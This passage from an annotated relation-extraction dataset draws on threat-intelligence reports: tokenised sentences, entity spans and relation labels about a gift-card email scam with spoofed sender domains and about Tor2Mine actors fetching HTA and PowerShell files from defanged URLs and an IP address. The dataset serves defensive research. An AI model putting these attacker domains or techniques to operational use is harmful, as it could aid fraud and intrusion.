6, "global_pos": [229, 229], "name": "DLL", "pos": [31, 32], "index": "21_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [236, 236], "name": ".NET", "pos": [38, 39], "index": "22_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [246, 246], "name": "malware payload", "pos": [48, 50], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [250, 250], "name": "target process", "pos": [52, 54], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [272, 272], "name": "injection", "pos": [74, 75], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [277, 277], "name": "target process", "pos": [79, 81], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [291, 291], "name": "DLL", "pos": [1, 2], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [297, 297], "name": "RunPE", "pos": [7, 8], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [320, 320], "name": "code", "pos": [30, 31], "index": "29_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 2, "t": 5}, {"r": "EX", "evidence": [2], "t": 4, "h": 5}, {"r": "CO", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [3], "t": 6, "h": 7}, {"r": "IJ", "evidence": [3], "h": 7, "t": 8}, {"r": "RD", "evidence": [4], "t": 9, "h": 12}, {"r": "RD", "evidence": [4], "t": 9, "h": 13}, {"r": "WR", "evidence": [4], "t": 10, "h": 13}, {"r": "WR", "evidence": [4], "t": 11, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "WR", "evidence": [4, 5], "t": 14, "h": 16}, {"r": "WR", "evidence": [4, 5], "t": 15, "h": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "EX", "evidence": [5], "h": 16, "t": 17}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "t": 20, "h": 22}, {"r": "WR", "evidence": [6], "t": 21, "h": 22}, {"r": "WR", "evidence": [6], "h": 22, "t": 23}, {"r": "WR", "evidence": [6], "t": 23, "h": 24}, {"r": "WR", "evidence": [6], "t": 23, "h": 24}, {"r": "UK", "evidence": [6], "h": 25, "t": 26}, {"r": "CO", "evidence": [6], "t": 19, "h": 20}, {"r": "CO", "evidence": [6], "h": 24, "t": 26}]}, {"title": "076-0", "sents": [["These", "emails", "typically", "come", "from", "a", "free", "email", "service", "(", "i.", "e", "."], ["The", "criminal", "pulls", "out", "all", "the", "stops", "to", "get", "their", "payoff", "."], ["Once", "the", "victim", "responds", ",", "the", "actor", "goes", "into", "action", ",", "requesting", "very", "specific", "amounts", "of", "gift", "cards", "typically", "in", "the", "$", "300", "-", "$", "500", "range", "."], ["Additionally", ",", "they", "will", "always", "request", "that", "the", "victim", "open", "the", "cards", ",", "expose", "the", "gift", "card", "numbers", ",", "take", "a", "picture", "of", "it", ",", "and", "send", "it", "to", "them", "via", "email", "."], ["First", "and", "foremost", "they", "work", "to", "actually", "spoof", "their", "initial", "email", "address", "in", "the", "``", "FROM", "''", "field", "."], ["In", "the", "image", "above", ",", "the", "company", "in", "question", "has", "been", "redacted", ",", "however", ",", "you", "can", "still", "see", "the", "reply-to", "address", "in", "the", "email", "(", "smtp-tls-outbound-eu-gateway", "@", "trustnet-gateway.cc", ")", "."], ["If", "the", "target", "were", "to", "reply", ",", "the", "email", "will", "be", "sent", "to", "that", "obviously", "illegitimate", "email", "."], ["Can", "you", "please", "let", "me", "know", "when", "you", "are", "available", "and", "the", "best", "number", "to", "reach", "you", "at", "?", "Regardless", ",", "they", "all", "used", "spoofed", "from", "addresses", "and", "leveraged", "the", "reply-to", "functionality", "to", "direct", "traffic", "to", "an", "email", "address", "leveraging", "the", "four", "domains", "they", "controlled", ":", "trustnet-gateway.cc", ",", "trustnet-server.cc", ",", "gateway-resolver.cc", ",", "intranetgateway.net", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "emails", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [7, 7], "name": "email service", "pos": [7, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "criminal", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "actor", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [55, 55], "name": "they", "pos": [2, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "cards", "pos": [11, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [84, 84], "name": "email", "pos": [31, 32], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "they", "pos": [3, 4], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [96, 96], "name": "email address", "pos": [10, 12], "index": "8_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [144, 144], "name": "email", "pos": [8, 9], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "RF", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "EX", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "CO", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 3, "t": 7}, {"r": "RD", "evidence": [3], "h": 4, "t": 5}, {"r": "IJ", "evidence": [3], "h": 4, "t": 6}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "FR", "evidence": [4, 5, 6], "h": 7, "t": 9}]}, {"title": "076-1", "sents": [["The", "criminal", "pulls", "out", "all", "the", "stops", "to", "get", "their", "payoff", "."], ["Once", "the", "victim", "responds", ",", "the", "actor", "goes", "into", "action", ",", "requesting", "very", "specific", "amounts", "of", "gift", "cards", "typically", "in", "the", "$", "300", "-", "$", "500", "range", "."], ["Additionally", ",", "they", "will", "always", "request", "that", "the", "victim", "open", "the", "cards", ",", "expose", "the", "gift", "card", "numbers", ",", "take", "a", "picture", "of", "it", ",", "and", "send", "it", "to", "them", "via", "email", "."], ["First", "and", "foremost", "they", "work", "to", "actually", "spoof", "their", "initial", "email", "address", "in", "the", "``", "FROM", "''", "field", "."], ["In", "the", "image", "above", ",", "the", "company", "in", "question", "has", "been", "redacted", ",", "however", ",", "you", "can", "still", "see", "the", "reply-to", "address", "in", "the", "email", "(", "smtp-tls-outbound-eu-gateway", "@", "trustnet-gateway.cc", ")", "."], ["If", "the", "target", "were", "to", "reply", ",", "the", "email", "will", "be", "sent", "to", "that", "obviously", "illegitimate", "email", "."], ["Can", "you", "please", "let", "me", "know", "when", "you", "are", "available", "and", "the", "best", "number", "to", "reach", "you", "at", "?", "Regardless", ",", "they", "all", "used", "spoofed", "from", "addresses", "and", "leveraged", "the", "reply-to", "functionality", "to", "direct", "traffic", "to", "an", "email", "address", "leveraging", "the", "four", "domains", "they", "controlled", ":", "trustnet-gateway.cc", ",", "trustnet-server.cc", ",", "gateway-resolver.cc", ",", "intranetgateway.net", "."], ["Once", "a", "victim", "responds", "to", "the", "initial", "email", ",", "the", "criminal", "begins", "asking", "for", "payment", "associated", "with", "the", "support", "contract", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "criminal", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "actor", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "they", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "cards", "pos": [11, 12], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [71, 71], "name": "email", "pos": [31, 32], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "they", "pos": [3, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "email address", "pos": [10, 12], "index": "6_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [131, 131], "name": "email", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "criminal", "pos": [10, 11], "index": "8_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "IJ", "evidence": [2], "h": 2, "t": 4}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "FR", "evidence": [3, 4, 5], "h": 5, "t": 7}]}, {"title": "076-2", "sents": [["Once", "the", "victim", "responds", ",", "the", "actor", "goes", "into", "action", ",", "requesting", "very", "specific", "amounts", "of", "gift", "cards", "typically", "in", "the", "$", "300", "-", "$", "500", "range", "."], ["Additionally", ",", "they", "will", "always", "request", "that", "the", "victim", "open", "the", "cards", ",", "expose", "the", "gift", "card", "numbers", ",", "take", "a", "picture", "of", "it", ",", "and", "send", "it", "to", "them", "via", "email", "."], ["First", "and", "foremost", "they", "work", "to", "actually", "spoof", "their", "initial", "email", "address", "in", "the", "``", "FROM", "''", "field", "."], ["In", "the", "image", "above", ",", "the", "company", "in", "question", "has", "been", "redacted", ",", "however", ",", "you", "can", "still", "see", "the", "reply-to", "address", "in", "the", "email", "(", "smtp-tls-outbound-eu-gateway", "@", "trustnet-gateway.cc", ")", "."], ["If", "the", "target", "were", "to", "reply", ",", "the", "email", "will", "be", "sent", "to", "that", "obviously", "illegitimate", "email", "."], ["Can", "you", "please", "let", "me", "know", "when", "you", "are", "available", "and", "the", "best", "number", "to", "reach", "you", "at", "?", "Regardless", ",", "they", "all", "used", "spoofed", "from", "addresses", "and", "leveraged", "the", "reply-to", "functionality", "to", "direct", "traffic", "to", "an", "email", "address", "leveraging", "the", "four", "domains", "they", "controlled", ":", "trustnet-gateway.cc", ",", "trustnet-server.cc", ",", "gateway-resolver.cc", ",", "intranetgateway.net", "."], ["Once", "a", "victim", "responds", "to", "the", "initial", "email", ",", "the", "criminal", "begins", "asking", "for", "payment", "associated", "with", "the", "support", "contract", "."], ["One", "simple", "step", "that", "some", "organizations", "can", "take", "is", "adding", "a", "tag", "to", "the", "subject", "line", "of", "the", "email", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "actor", "pos": [6, 7], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "they", "pos": [2, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "cards", "pos": [11, 12], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [59, 59], "name": "email", "pos": [31, 32], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "they", "pos": [3, 4], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [71, 71], "name": "email address", "pos": [10, 12], "index": "5_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [119, 119], "name": "email", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [193, 193], "name": "criminal", "pos": [10, 11], "index": "7_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "IJ", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 4, "t": 6}]}, {"title": "076-3", "sents": [["Additionally", ",", "they", "will", "always", "request", "that", "the", "victim", "open", "the", "cards", ",", "expose", "the", "gift", "card", "numbers", ",", "take", "a", "picture", "of", "it", ",", "and", "send", "it", "to", "them", "via", "email", "."], ["First", "and", "foremost", "they", "work", "to", "actually", "spoof", "their", "initial", "email", "address", "in", "the", "``", "FROM", "''", "field", "."], ["In", "the", "image", "above", ",", "the", "company", "in", "question", "has", "been", "redacted", ",", "however", ",", "you", "can", "still", "see", "the", "reply-to", "address", "in", "the", "email", "(", "smtp-tls-outbound-eu-gateway", "@", "trustnet-gateway.cc", ")", "."], ["If", "the", "target", "were", "to", "reply", ",", "the", "email", "will", "be", "sent", "to", "that", "obviously", "illegitimate", "email", "."], ["Can", "you", "please", "let", "me", "know", "when", "you", "are", "available", "and", "the", "best", "number", "to", "reach", "you", "at", "?", "Regardless", ",", "they", "all", "used", "spoofed", "from", "addresses", "and", "leveraged", "the", "reply-to", "functionality", "to", "direct", "traffic", "to", "an", "email", "address", "leveraging", "the", "four", "domains", "they", "controlled", ":", "trustnet-gateway.cc", ",", "trustnet-server.cc", ",", "gateway-resolver.cc", ",", "intranetgateway.net", "."], ["Once", "a", "victim", "responds", "to", "the", "initial", "email", ",", "the", "criminal", "begins", "asking", "for", "payment", "associated", "with", "the", "support", "contract", "."], ["One", "simple", "step", "that", "some", "organizations", "can", "take", "is", "adding", "a", "tag", "to", "the", "subject", "line", "of", "the", "email", "."], ["If", "you", "hit", "reply", ",", "does", "the", "address", "you", "are", "replying", "to", "change", "?"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "they", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "cards", "pos": [11, 12], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [31, 31], "name": "email", "pos": [31, 32], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "they", "pos": [3, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [43, 43], "name": "email address", "pos": [10, 12], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [91, 91], "name": "email", "pos": [8, 9], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [165, 165], "name": "criminal", "pos": [10, 11], "index": "6_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "IJ", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1, 2, 3], "h": 3, "t": 5}]}, {"title": "087-0", "sents": [["In", "one", "cluster", "of", "activity", "against", "a", "telecommunications", "company", ",", "we", "observed", "the", "attacker", "executing", "PowerShell", "commands", "to", "download", "files", "from", "multiple", "Tor2Mine-related", "domains", "."], ["The", "attacker", "attempts", "to", "run", "Microsoft", "HTML", "Applications", "(", "HTA", ")", "from", "multiple", "URLs", "(", "listed", "below", ")", "using", "Mshta", ",", "a", "utility", "for", "executing", "HTA", "files", ":", "hxxps", ":", "//qm7gmtaagejolddt.onion.to/check.htahxxp", ":", "//res1.myrms.pw/upd.htahxxp", ":", "//eu1.minerpool.pw/check.hta", "The", "qm7gmtaagejolddt.onion.domain", "is", "a", "known", "Tor2web", "gateway", "used", "by", "Tor2Mine", "actors", "to", "proxy", "communications", "."], ["The", "res1.myrms.pw", "domain", "also", "appears", "to", "have", "connections", "to", "Tor2Mine", ",", "as", "it", "is", "hosted", "on", "an", "IP", "address", "(", "107.181.187.132", ")", "previously", "known", "to", "be", "used", "by", "Tor2Mine", "actors", "."], ["In", "the", "activity", "outlined", "in", "our", "2018", "blog", ",", "Tor2Mine", "actors", "used", "a", "PowerShell", "script", "to", "install", "follow-on", "malware", "onto", "the", "compromised", "system", "from", "this", "same", "IP", "."], ["The", "eu1.minerpool.pw", ",", "also", "hosted", "on", "107.181.187.132", ",", "is", "the", "same", "mining", "pool", "the", "actors", "used", "in", "the", "2018", "activity", "."], ["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "attacker", "pos": [13, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "PowerShell commands", "pos": [15, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "files", "pos": [19, 20], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [22, 22], "name": "Tor2Mine-related domains", "pos": [22, 24], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "attacker", "pos": [1, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "Microsoft HTML Applications", "pos": [5, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [44, 44], "name": "Mshta", "pos": [19, 20], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "HTA files", "pos": [25, 27], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [61, 61], "name": "qm7gmtaagejolddt.onion.domain", "pos": [36, 37], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [70, 70], "name": "actors", "pos": [45, 46], "index": "9_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [72, 72], "name": "proxy communications", "pos": [47, 49], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [76, 76], "name": "res1.myrms.pw", "pos": [1, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [84, 84], "name": "Tor2Mine", "pos": [9, 10], "index": "12_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [95, 95], "name": "107.181.187.132", "pos": [20, 21], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "Tor2Mine", "pos": [9, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [119, 119], "name": "PowerShell script", "pos": [13, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [124, 124], "name": "malware", "pos": [18, 19], "index": "16_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [132, 132], "name": "IP", "pos": [26, 27], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [135, 135], "name": "eu1.minerpool.pw", "pos": [1, 2], "index": "18_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [140, 140], "name": "107.181.187.132", "pos": [6, 7], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [148, 148], "name": "actors", "pos": [14, 15], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [156, 156], "name": "actor", "pos": [1, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [160, 160], "name": "PowerShell command", "pos": [5, 7], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [165, 165], "name": ".ps1", "pos": [10, 11], "index": "23_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [168, 168], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "24_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [173, 173], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [190, 190], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "27_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [197, 197], "name": "nameservers", "pos": [14, 15], "index": "28_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 9}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 20}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 21}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "EX", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [1], "t": 8, "h": 9}, {"r": "RF", "evidence": [1], "t": 8, "h": 9}, {"r": "FR", "evidence": [1], "h": 9, "t": 10}, {"r": "ST", "evidence": [2], "t": 11, "h": 12}, {"r": "RF", "evidence": [2], "t": 11, "h": 12}, {"r": "CO", "evidence": [2], "h": 11, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 11, "t": 17}, {"r": "EX", "evidence": [3], "h": 14, "t": 15}, {"r": "FR", "evidence": [3], "h": 14, "t": 16}, {"r": "ST", "evidence": [3], "h": 16, "t": 17}, {"r": "RF", "evidence": [3], "h": 16, "t": 17}, {"r": "RD", "evidence": [3, 4], "t": 15, "h": 20}, {"r": "ST", "evidence": [4, 5], "h": 20, "t": 24}, {"r": "RF", "evidence": [4, 5], "h": 20, "t": 24}, {"r": "CO", "evidence": [4], "h": 18, "t": 19}, {"r": "EX", "evidence": [5], "h": 21, "t": 22}, {"r": "WR", "evidence": [5], "h": 21, "t": 23}, {"r": "ST", "evidence": [5], "h": 21, "t": 24}, {"r": "RF", "evidence": [5], "h": 21, "t": 24}, {"r": "ST", "evidence": [5, 6], "h": 21, "t": 25}, {"r": "RF", "evidence": [5, 6], "h": 21, "t": 25}, {"r": "ST", "evidence": [5, 6, 7], "h": 21, "t": 27}, {"r": "RF", "evidence": [5, 6, 7], "h": 21, "t": 27}, {"r": "ST", "evidence": [5, 6, 7], "h": 21, "t": 28}, {"r": "RF", "evidence": [5, 6, 7], "h": 21, "t": 28}, {"r": "CO", "evidence": [6, 7], "h": 25, "t": 26}]}, {"title": "087-1", "sents": [["The", "attacker", "attempts", "to", "run", "Microsoft", "HTML", "Applications", "(", "HTA", ")", "from", "multiple", "URLs", "(", "listed", "below", ")", "using", "Mshta", ",", "a", "utility", "for", "executing", "HTA", "files", ":", "hxxps", ":", "//qm7gmtaagejolddt.onion.to/check.htahxxp", ":", "//res1.myrms.pw/upd.htahxxp", ":", "//eu1.minerpool.pw/check.hta", "The", "qm7gmtaagejolddt.onion.domain", "is", "a", "known", "Tor2web", "gateway", "used", "by", "Tor2Mine", "actors", "to", "proxy", "communications", "."], ["The", "res1.myrms.pw", "domain", "also", "appears", "to", "have", "connections", "to", "Tor2Mine", ",", "as", "it", "is", "hosted", "on", "an", "IP", "address", "(", "107.181.187.132", ")", "previously", "known", "to", "be", "used", "by", "Tor2Mine", "actors", "."], ["In", "the", "activity", "outlined", "in", "our", "2018", "blog", ",", "Tor2Mine", "actors", "used", "a", "PowerShell", "script", "to", "install", "follow-on", "malware", "onto", "the", "compromised", "system", "from", "this", "same", "IP", "."], ["The", "eu1.minerpool.pw", ",", "also", "hosted", "on", "107.181.187.132", ",", "is", "the", "same", "mining", "pool", "the", "actors", "used", "in", "the", "2018", "activity", "."], ["The", "actor", "also", "used", "a", "PowerShell", "command", "to", "download", "a", ".ps1", "file", "from", "hxxp", ":", "//v1.fym5gserobhh.pw/v1/check1.ps1", "."], ["The", "v1.fym5gserobhh.pw", "domain", "is", "hosted", "on", "the", "same", "aforementioned", "IP", "."], ["According", "to", "Umbrella", "data", ",", "v1.fym5gserobhh.pw", "and", "eu1.minerpool.pw", "are", "registered", "under", "two", "different", "reg.ru", "nameservers", "(", "ns2.reg.ru", "and", "ns1.reg.ru", ")", "."], ["In", "similar", "activity", "related", "to", "another", "company", "in", "mid-May", ",", "we", "saw", "the", "actors", "using", "Mshta", "to", "execute", "HTA", "files", "from", "many", "of", "the", "same", "URLs", "mentioned", "above", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "attacker", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "Microsoft HTML Applications", "pos": [5, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [19, 19], "name": "Mshta", "pos": [19, 20], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [25, 25], "name": "HTA files", "pos": [25, 27], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [36, 36], "name": "qm7gmtaagejolddt.onion.domain", "pos": [36, 37], "index": "4_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [45, 45], "name": "actors", "pos": [45, 46], "index": "5_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [47, 47], "name": "proxy communications", "pos": [47, 49], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [51, 51], "name": "res1.myrms.pw", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [59, 59], "name": "Tor2Mine", "pos": [9, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [70, 70], "name": "107.181.187.132", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [90, 90], "name": "Tor2Mine", "pos": [9, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "PowerShell script", "pos": [13, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [99, 99], "name": "malware", "pos": [18, 19], "index": "12_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [107, 107], "name": "IP", "pos": [26, 27], "index": "13_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [110, 110], "name": "eu1.minerpool.pw", "pos": [1, 2], "index": "14_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [115, 115], "name": "107.181.187.132", "pos": [6, 7], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [123, 123], "name": "actors", "pos": [14, 15], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [131, 131], "name": "actor", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "PowerShell command", "pos": [5, 7], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": ".ps1", "pos": [10, 11], "index": "19_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [143, 143], "name": "hxxp : //v1.fym5gserobhh.pw/v1/check1.ps1", "pos": [13, 16], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [148, 148], "name": "v1.fym5gserobhh.pw", "pos": [1, 2], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [163, 163], "name": "v1.fym5gserobhh.pw", "pos": [5, 6], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [165, 165], "name": "eu1.minerpool.pw", "pos": [7, 8], "index": "23_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [172, 172], "name": "nameservers", "pos": [14, 15], "index": "24_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [192, 192], "name": "actors", "pos": [13, 14], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [194, 194], "name": "Mshta", "pos": [15, 16], "index": "26_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [197, 197], "name": "HTA files", "pos": [18, 20], "index": "27_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "t": 4, "h": 5}, {"r": "RF", "evidence": [0], "t": 4, "h": 5}, {"r": "FR", "evidence": [0], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "t": 7, "h": 8}, {"r": "RF", "evidence": [1], "t": 7, "h": 8}, {"r": "CO", "evidence": [1], "h": 7, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 13}, {"r": "EX", "evidence": [2], "h": 10, "t": 11}, {"r": "FR", "evidence": [2], "h": 10, "t": 12}, {"r": "ST", "evidence": [2], "h": 12, "t": 13}, {"r": "RF", "evidence": [2], "h": 12, "t": 13}, {"r": "RD", "evidence": [2, 3], "t": 11, "h": 16}, {"r": "ST", "evidence": [3, 4], "h": 16, "t": 20}, {"r": "RF", "evidence": [3, 4], "h": 16, "t": 20}, {"r": "CO", "evidence": [3], "h": 14, "t": 15}, {"r": "EX", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 17, "t": 19}, {"r": "ST", "evidence": [4], "h": 17, "t": 20}, {"r": "RF", "evidence": [4], "h": 17, "t": 20}, {"r": "ST", "evidence": [4, 5], "h": 17, "t": 21}, {"r": "RF", "evidence": [4, 5], "h": 17, "t": 21}, {"r": "ST", "evidence": [4, 5, 6], "h": 17, "t": 23}, {"r": "RF", "evidence": [4, 5, 6], "h": 17, "t": 23}, {"r": "ST", "evidence": [4, 5, 6], "h": 17, "t": 24}, {"r": "RF", "evidence": [4, 5, 6], "h": 17, "t": 24}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 17, "t": 25}, {"r": "CO", "evidence": [5, 6], "h": 21, "t": 22}, {"r": "FR", "evidence": [7], "h": 25, "t": 26}, {"r": "ST", "evidence": [6, 7], "t": 22, "h": 26}, {"r": "RF", 